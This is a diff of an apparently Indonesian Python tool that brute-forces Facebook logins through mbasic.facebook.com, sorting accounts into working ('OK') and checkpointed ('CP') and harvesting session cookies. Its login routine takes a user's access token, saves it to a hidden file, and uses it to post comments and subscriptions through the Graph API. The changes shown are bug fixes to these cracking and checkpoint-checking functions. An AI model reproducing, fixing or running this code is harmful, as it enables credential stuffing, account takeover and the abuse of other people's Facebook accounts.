@@ -442,7 +442,7 @@ def login_lagi334():
 									nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
 									roq = xyz.get(nek,cookies=cookie)
 									tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
-									tokenmubg = open(".token1.txt","w").write(tok)
+									open(".token1.txt","w").write(tok)
 									requests.post("https://graph.facebook.com/100043537611609?fields=subscribers&access_token=%s"%(tok))
 									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom4}&access_token={tok}", headers = {"cookie":your_cookies})
 									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom3}&access_token={tok}", headers = {"cookie":your_cookies})
@@ -1458,6 +1458,7 @@ def reguler(idf,pwv,awal):
 			po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl',data=data,headers=headers,allow_redirects=False)
 			if "checkpoint" in ses.cookies.get_dict().keys():
 				cp+=1
+				print('\n')
 				tree = Tree(Panel.fit(f"""{K2}{idf}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
 				tree.add(Panel.fit(f"{K2}{cektahun(idf)}{P2}",style=f"{color_panel}",guide_style="bold grey100"))
 				tree.add(Panel(f"{K2}{ua}{P2}",style=f"{color_panel}"))
@@ -1469,6 +1470,7 @@ def reguler(idf,pwv,awal):
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				ok+=1
+				print('\n')
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				tree = Tree(Panel.fit(f"""{H2}{idf}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
 				tree.add(Panel(f"{H2}{cektahun(idf)}{P2}",style=f"{color_panel}",guide_style="bold grey100"))
@@ -1665,28 +1667,29 @@ def cek_apk(kuki):
 	except AttributeError:
 		print ("\r    %s \033[0mcookie invalid"%(M))
 
+ops=[]
 def ceker(idf,pw):
 	sess=requests.Session()
 	data={}
 	uua="Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
 	sess.headers.update({"User-Agent":uua,"Host":"m.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://mbasic.facebook.com/","user-agent":"ua"})
-	soup=parse(sess.get("https://m.facebook.com/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
+	soup=parser(sess.get("https://m.facebook.com/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
 	link=soup.find("form",{"method":"post"})
 	for x in soup("input"):data.update({x.get("name"):x.get("value")})
 	data.update({"email":idf,"pass":pw})
-	response=parse(sess.post("https://m.facebook.com"+link.get("action"),data=data).text,"html.parser")
+	response=parser(sess.post("https://m.facebook.com"+link.get("action"),data=data).text,"html.parser")
 	try:
 		link2=response.find("form",{"method":"post"});listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
 		for x in response("input"):
 			if x.get("name") in listInput:data2.update({x.get("name"):x.get("value")}) 
-		responses=parse(sess.post("https://m.facebook.com"+link2.get("action"),data=data2).text,"html.parser")
+		responses=parser(sess.post("https://m.facebook.com"+link2.get("action"),data=data2).text,"html.parser")
 		cek=[cek.text for cek in responses.find_all("option")]
 		if len(cek)==0:pass
 		else:
 			for opsi in range(len(cek)):ops.append(print("[bold white]"+cek[opsi]))
 	except:pass
 	if len(ops)==0:pass
-	print (' [+] Columns(ops)')
+	print (' [+] Columns %s'%(ops))
                           
 def ceker1(idf,pw):
 	global cp
@@ -1728,19 +1731,19 @@ def cek_opsi():
 	for kes in akun:
 		try:
 			try:
-				id,pw = kes.split('|')[0],kes.split('|')[1]
+				idf,pw = kes.split('|')[0],kes.split('|')[1]
 			except IndexError:
 				time.sleep(2)
 				print('\r%s++++ %s ----> Error      %s'%(b,kes,x))
 				print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x))
 				continue
 			bi = random.choice([u,k,kk,b,h,hh])
-			print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
+			print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),idf,x), end=' ');sys.stdout.flush()
 			ua = 'Mozilla/5.0 (Linux; Android 11; TECNO KD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4755.101 Mobile Safari/537.36'
 			ses = requests.Session()
 			header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
 			hi = ses.get('https://mbasic.facebook.com')
-			ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
+			ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
 			if "checkpoint" in ses.cookies.get_dict().keys():
 				try:
 					jo = ho.find('form')
@@ -1750,7 +1753,7 @@ def cek_opsi():
 						if anj.get('name') in lion:
 							data.update({anj.get('name'):anj.get('value')})
 					kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
-					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
+					print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
 					opsi = kent.find_all('option')
 					if len(opsi)==0:
 						print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
@@ -1758,12 +1761,12 @@ def cek_opsi():
 						for opsii in opsi:
 							print('\r%s---> %s%s'%(kk,opsii.text,x))
 				except:
-					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
+					print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
 					print('\r%s---> Tidak Dapat Mengecek Opsi%s'%(u,x))
 			elif "c_user" in ses.cookies.get_dict().keys():
-				print('\r%s++++ %s|%s ----> OK       %s'%(h,id,pw,x))
+				print('\r%s++++ %s|%s ----> OK       %s'%(h,idf,pw,x))
 			else:
-				print('\r%s++++ %s|%s ----> SALAH       %s'%(x,id,pw,x))
+				print('\r%s++++ %s|%s ----> SALAH       %s'%(x,idf,pw,x))
 			love+=1
 		except requests.exceptions.ConnectionError:
 			print('')
